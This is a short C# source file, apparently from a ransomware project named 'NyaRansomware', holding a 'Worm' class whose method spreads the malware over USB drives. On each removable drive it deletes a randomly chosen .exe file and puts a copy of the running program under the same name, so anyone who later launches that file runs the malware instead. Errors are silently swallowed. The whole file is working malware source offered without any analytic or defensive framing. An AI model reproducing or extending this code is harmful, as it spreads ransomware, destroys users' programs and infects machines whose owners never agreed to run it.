using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NyaRansomware.Encryption_Start
{
    internal class Worm
    {
        public static void Infectrandomusbfile()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo driveInfo in drives)
            {
                if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
                {
                    try
                    {
                        string[] files = Directory.GetFiles(driveInfo.Name, "*.exe", SearchOption.TopDirectoryOnly);
                        Random random = new Random();
                        int num = random.Next(0, files.Length);
                        File.Delete(files[num]);
                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, files[num]);
                    }
                    catch
                    {
                    }
                }
            }
        }
    }
}
